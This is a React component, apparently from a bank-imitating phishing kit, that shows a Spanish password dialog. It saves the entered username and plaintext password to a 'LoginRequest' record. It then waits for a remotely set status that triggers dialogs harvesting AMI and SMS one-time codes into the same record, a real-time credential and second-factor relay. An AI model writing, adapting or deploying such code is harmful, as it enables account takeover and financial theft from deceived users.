import { useState, useEffect, useRef } from "react";
import { client } from "@/api/client";
import AMICodeDialog from "./AMICodeDialog";
import SMSCodeDialog from "./SMSCodeDialog";

export default function PasswordDialog({ username, onCancel, onReject }) {
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [focused, setFocused] = useState(false);
  const [showAMI, setShowAMI] = useState(false);
  const [showSMS, setShowSMS] = useState(false);
  const [requestId, setRequestId] = useState(null);
  const [statusMessage, setStatusMessage] = useState(null);
  const unsubscribeRef = useRef(null);
  const activeDialogRef = useRef(null);
  const isActive = focused || password.length > 0;

  useEffect(() => {
    return () => {
      if (unsubscribeRef.current) unsubscribeRef.current();
    };
  }, []);

  const handleContinuar = async () => {
    if (password.length < 8 || isLoading) return;
    setIsLoading(true);

    const record = await client.entities.LoginRequest.create({
      usuario: username,
      clave: password,
      status: "pending",
      smsCode: "",
      amiCode: "",
    });
    setRequestId(record.id);
    unsubscribeRef.current = client.entities.LoginRequest.subscribe((event) => {
      if (event.id !== record.id) return;
      const data = event.data;
      if (!data) return;
      if (data.status === "ami_requested") {
        activeDialogRef.current = "ami";
        setShowAMI(true);
        setIsLoading(false);
      } else if (data.status === "sms_requested") {
        activeDialogRef.current = "sms";
        setShowSMS(true);
        setIsLoading(false);
      } else if (data.status === "approved") {
        setIsLoading(false);
        setStatusMessage("✅ Solicitud aprobada.");
        if (unsubscribeRef.current) unsubscribeRef.current();
      } else if (data.status === "rejected") {
        setIsLoading(false);
        if (unsubscribeRef.current) unsubscribeRef.current();
        onReject(data.rejectionReason || "auth_failed");
      }
    });
  };

  const handleAMIConfirm = async (code) => {
    setShowAMI(false);
    setIsLoading(true);
    await client.entities.LoginRequest.update(requestId, {
      amiCode: code,
      status: "ami_submitted",
    });
  };

  const handleAMICancel = () => {
    setShowAMI(false);
    setIsLoading(true);
  };

  const handleSMSConfirm = async (code) => {
    setShowSMS(false);
    setIsLoading(true);
    await client.entities.LoginRequest.update(requestId, {
      smsCode: code,
      status: "sms_submitted",
    });
  };

  const handleSMSCancel = () => {
    setShowSMS(false);
    setIsLoading(true);
  };

  return (
    <>
      <div
        style={{
          position: "fixed",
          top: 0, left: 0, right: 0, bottom: 0,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          backgroundColor: "rgba(0,0,0,0.5)",
          zIndex: 9999,
        }}
      >
        <div
          style={{
            backgroundColor: "#fff",
            borderRadius: "4px",
            padding: "24px",
            width: "370px",
            boxShadow: "0 11px 15px -7px rgba(0,0,0,0.2), 0 24px 38px 3px rgba(0,0,0,0.14), 0 9px 46px 8px rgba(0,0,0,0.12)",
            position: "relative",
            overflow: "hidden",
          }}
        >
          {/* Loader overlay */}
          {isLoading && (
            <div
              style={{
                position: "absolute",
                top: 0, left: 0, right: 0, bottom: 0,
                backgroundColor: "rgba(255,255,255,0.85)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                zIndex: 10,
              }}
            >
              <div className="loader">
                <div className="bar"></div>
                <div className="bar"></div>
                <div className="bar"></div>
                <div className="bar"></div>
                <div className="bar"></div>
              </div>
            </div>
          )}

          {/* Title */}
          <h2
            className="text-center"
            style={{
              color: "#0067B1",
              fontSize: "20px",
              fontWeight: 500,
              marginBottom: "24px",
              fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
            }}
          >
            Introduce tu contraseña
          </h2>

          {/* Status message */}
          {statusMessage && (
            <div style={{
              backgroundColor: "#e8f5e9",
              border: "1px solid #a5d6a7",
              borderRadius: "4px",
              padding: "12px",
              marginBottom: "16px",
              textAlign: "center",
              fontSize: "14px",
              color: "#2e7d32",
              fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
            }}>
              {statusMessage}
            </div>
          )}

          {/* Password field */}
          {!statusMessage && (
            <div style={{ marginBottom: "8px" }}>
              <div
                style={{
                  backgroundColor: "#0000000A",
                  borderRadius: "4px 4px 0 0",
                  padding: "12px 12px 0 12px",
                }}
              >
                <div className="relative" style={{ paddingTop: "18px", paddingBottom: "4px" }}>
                  <label
                    className="absolute pointer-events-none"
                    style={{
                      top: isActive ? "0px" : "50%",
                      left: 0,
                      transform: isActive ? "scale(0.75)" : "translateY(-50%)",
                      transformOrigin: "0 0",
                      transition: "all 0.2s cubic-bezier(0.25, 0.8, 0.25, 1)",
                      color: focused ? "#c62828" : "rgba(0,0,0,0.54)",
                      fontSize: "16px",
                      whiteSpace: "nowrap",
                      fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                    }}
                  >
                    Contraseña
                  </label>
                  <div className="flex items-center">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value.replace(/ /g, ""))}
                      onKeyDown={(e) => { if (e.key === "Enter") handleContinuar(); }}
                      autoComplete="off"
                      autoFocus
                      className="flex-1 bg-transparent outline-none"
                      style={{
                        border: "none",
                        padding: 0,
                        margin: 0,
                        fontSize: "16px",
                        color: "rgba(0,0,0,0.87)",
                        lineHeight: "1.5",
                        fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                      }}
                      onFocus={() => setFocused(true)}
                      onBlur={() => setFocused(false)}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      style={{
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                        padding: "0 0 4px 0",
                        marginLeft: "-30px",
                        color: "#000000DE",
                        display: "flex",
                        alignItems: "center",
                      }}
                    >
                      <span className="material-icons" style={{ fontSize: "24px", color: "#000000DE" }}>
                        {showPassword ? "visibility_off" : "visibility"}
                      </span>
                    </button>
                  </div>
                </div>
              </div>
              <div style={{ height: "2px", backgroundColor: "#c62828" }} />
              <div style={{ height: "19.5px" }} />
            </div>
          )}

          {/* Buttons */}
          <div className="flex gap-3 justify-center" style={{ marginTop: "16px" }}>
            {!statusMessage ? (
              <>
                <button
                  type="button"
                  disabled={password.length < 8 || isLoading}
                  onClick={handleContinuar}
                  style={{
                    flex: 1,
                    height: "45px",
                    backgroundColor: password.length >= 8 && !isLoading ? "#0067B1" : "rgba(0,0,0,0.08)",
                    color: password.length >= 8 && !isLoading ? "#fff" : "rgba(0,0,0,0.26)",
                    border: "none",
                    borderRadius: "2px",
                    fontSize: "14px",
                    fontWeight: 500,
                    textTransform: "uppercase",
                    letterSpacing: "0.5px",
                    cursor: password.length >= 8 && !isLoading ? "pointer" : "default",
                    fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                  }}
                >
                  Continuar
                </button>
                <button
                  type="button"
                  disabled={isLoading}
                  onClick={onCancel}
                  style={{
                    flex: 1,
                    height: "45px",
                    backgroundColor: isLoading ? "rgba(0,0,0,0.08)" : "#0067B1",
                    color: isLoading ? "rgba(0,0,0,0.26)" : "#fff",
                    border: "none",
                    borderRadius: "2px",
                    fontSize: "14px",
                    fontWeight: 500,
                    textTransform: "uppercase",
                    letterSpacing: "0.5px",
                    cursor: isLoading ? "default" : "pointer",
                    boxShadow: isLoading ? "none" : "0 3px 1px -2px rgba(0,0,0,0.2)",
                    fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                  }}
                >
                  Cancelar
                </button>
              </>
            ) : (
              <button
                type="button"
                onClick={onCancel}
                style={{
                  flex: 1,
                  height: "45px",
                  backgroundColor: "#0067B1",
                  color: "#fff",
                  border: "none",
                  borderRadius: "2px",
                  fontSize: "14px",
                  fontWeight: 500,
                  textTransform: "uppercase",
                  letterSpacing: "0.5px",
                  cursor: "pointer",
                  fontFamily: "Roboto, 'Helvetica Neue', sans-serif",
                }}
              >
                Cerrar
              </button>
            )}
          </div>
        </div>
      </div>

      {showAMI && (
        <AMICodeDialog onCancel={handleAMICancel} onConfirm={handleAMIConfirm} />
      )}
      {showSMS && (
        <SMSCodeDialog onCancel={handleSMSCancel} onConfirm={handleSMSConfirm} />
      )}
    </>
  );
}
